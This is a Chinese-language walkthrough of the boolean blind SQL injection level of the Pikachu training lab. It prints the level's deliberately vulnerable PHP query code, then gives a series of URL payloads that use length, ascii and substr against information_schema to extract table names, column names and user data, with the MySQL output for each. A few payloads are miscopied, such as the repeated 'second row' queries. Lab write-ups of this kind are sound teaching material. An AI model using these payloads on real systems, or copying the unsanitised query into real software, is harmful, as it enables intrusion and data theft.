# 基于boolian的盲注

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_blind_b.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();

$html='';
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result=mysqli_query($link, $query);//
//     $result=execute($link, $query);
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}



?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">基于boolian的盲注</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="admin/123456">
                点一下提示~
            </a>


        </div>
        <div class="page-content">
            <div id="sqli_main">
                <p class="sqli_title">what's your username?</p>
                <form method="get">
                    <input class="sqli_in" type="text" name="name" />
                    <input class="sqli_submit" type="submit" name="submit" value="查询" />
                </form>
                <?php echo $html;?>
            </div>





        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可知该关卡对sql注入无任何防护

***

# 二、通关教程

判断注入

```
?name=lili		# 回显正常(可以查询到数据)
?name=lili'		# 回显异常(查询不到数据)
?name=lili'%23	# 回显正常(可以查询到数据)

// 得出该处存在SQL注入，且闭合符号为 '
```

猜数据库名长度

当数据库名长度大于等于7时回显正常，说明数据库名长度为7

```
?name=lili' and length(database())>=7	# 回显正常
?name=lili' and length(database())>=8	# 回显异常

# SQL语句如下
mysql> select id,email from member where username='lili' and length(database())>=7;
+----+------------------+
| id | email            |
+----+------------------+
|  7 | lili@pikachu.com |
+----+------------------+
```

猜数据库名

当数据库名第一个字符的Ascii码为112时回显正常，为113时回显异常，可以得出数据库名第一个字符的Ascii码为112，Ascii转字符串为 p ，数据库名的其他字符以此类推，得出数据库名pikachu

```
?name=lili' and ascii((select database() limit 0,1))>=112%23	# 正常
?name=lili' and ascii((select database() limit 0,1))>=113%23	# 异常

# SQL语句如下
mysql> select id,email from member where username='lili' and ascii((select database() limit 0,1))>=112;
+----+------------------+
| id | email            |
+----+------------------+
|  7 | lili@pikachu.com |
+----+------------------+
```

猜数据表个数

猜当前数据库表个数为6张时回显异常，为5张时回显正常，可以得出当前数据库下有5个数据表

```
?name=lili' and (select count(table_name) from information_schema.tables where table_schema=database())>=6%23
?name=lili' and (select count(table_name) from information_schema.tables where table_schema=database())>=5%23

# SQL语句如下
mysql> select id,email from member where username='lili' and (select count(table_name) from information_schema.tables where table_schema=database())>=6;
Empty set (0.00 sec)

mysql> select id,email from member where username='lili' and (select count(table_name) from information_schema.tables where table_schema=database())>=5;
+----+------------------+
| id | email            |
+----+------------------+
|  7 | lili@pikachu.com |
+----+------------------+
```

猜数据表名长度

猜第一张数据表表名长度为9时回显异常，为8时回显正常，得出第一张数据表的表名长度为8

```
?name=lili' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>=9%23
?name=lili' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>=8%23
```

猜数据表名

猜第一张表表名的第一个字符的Ascii码大于等于103时回显异常，大于等于104时回显正常，得出第一张表表名的第一个字符Ascii码为104，转为字符串为h，按照顺序猜出余下的表名（httpinfo | member | message | users | xssblind）

```
# 猜第一张表表名的第一个字符串
?name=lili' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=105%23
?name=lili' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=104%23

# 猜第一张表表名的第二个字符串
?name=lili' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>=116%23
```

```
# 猜第二张表表名的第一个字符串
?name=lili' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>=109%23

# 猜第二张表表名的第二个字符串
?name=lili' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))>=101%23
```

猜字段个数

猜users表中有5个字段时回显异常，有4个字段数时回显正常，得出users表下有4个字段，按顺序将其他表的字段个数猜出即可

```
?name=lili' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>=5%23
?name=lili' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>=4%23

# SQL语句如下
mysql> select id,email from member where username='lili' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>=5;
Empty set (0.01 sec)

mysql> select id,email from member where username='lili' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>=4;
+----+------------------+
| id | email            |
+----+------------------+
|  7 | lili@pikachu.com |
+----+------------------+
```

猜字段名长度

猜第一个字段名长度为3个字符时回显异常，为2个字符时回显正常，得出数据表users的第一个字段名长度为2个字符，按顺序将其他字段的长度猜出即可

```
?name=lili' and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))>=2%23
?name=lili' and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))>=2%23
```

猜字段名

猜users表下的第一个字段的第一个字符的ascii码为106时回显异常，为105时回显正常，得出第一个字段的第一个字符ascii码为105，转为字符串为 i ，按顺序将其他字段名猜出即可 (id | username | password |level)

```
?name=lili' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))>=106%23
?name=lili' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))>=105%23
```

猜字段内容个数

猜users表下的字段id内容的个数大于等于3时返回异常，大于等于四时返回正常，得出该字段下一共有3个内容

```
?name=lili' and (select count(id) from users)>=3	# 正常
?name=lili' and (select count(id) from users)>=4	# 异常
```

猜字段内容长度

```
# 数据表users下的username字段的第一、二行数据内容长度
?name=lili' and length((select username from users limit 0,1))>=5%23	# 第一行
?name=lili' and length((select username from users limit 0,1))>=7%23	# 第二行
```

猜字段内容

按照顺序以此类推猜出所有的字段内容

```
# 猜username字段的第一行内容的第一、二个字符串
?name=lili' and ascii(substr((select username from users limit 0,1),1,1))>=97%23	# 正常
?name=lili' and ascii(substr((select username from users limit 0,1),2,1))>=100%23	# 正常

# 猜username字段的第二行内容的第一、二个字符串
?name=lili' and ascii(substr((select username from users limit 0,1),1,1))>=97%23	# 正常
?name=lili' and ascii(substr((select username from users limit 0,1),2,1))>=100%23	# 正常
```

